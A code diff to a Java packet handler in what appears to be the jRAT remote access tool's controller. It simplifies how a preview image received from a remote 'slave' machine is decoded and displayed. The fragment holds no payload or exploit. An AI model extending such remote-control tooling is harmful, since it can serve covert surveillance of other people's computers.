@@ -1,6 +1,5 @@
 package se.jrat.client.packets.incoming;
 
-import java.awt.Graphics;
 import java.awt.image.BufferedImage;
 import java.io.DataInputStream;
 
@@ -13,8 +12,6 @@ public class Packet43PreviewImage extends AbstractIncomingPacket {
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
 		FramePreviewImage frame = FramePreviewImage.instances.get(slave);
-		int w = slave.readInt();
-		int h = slave.readInt();
 		
 		int imageSize = slave.readInt();
 
@@ -24,12 +21,7 @@ public class Packet43PreviewImage extends AbstractIncomingPacket {
 
 		if (frame != null) {
 
-			BufferedImage image = new BufferedImage(w, h, BufferedImage.TYPE_INT_RGB);
-
-			Graphics imageGraphics = image.getGraphics();
-
-			BufferedImage img = ImageUtils.decodeImage(buffer);
-			imageGraphics.drawImage(img, 0, 0, w, h, null);
+			BufferedImage image = ImageUtils.decodeImage(buffer);
 
 			frame.getPanel().image = image;
 			frame.getPanel().repaint();
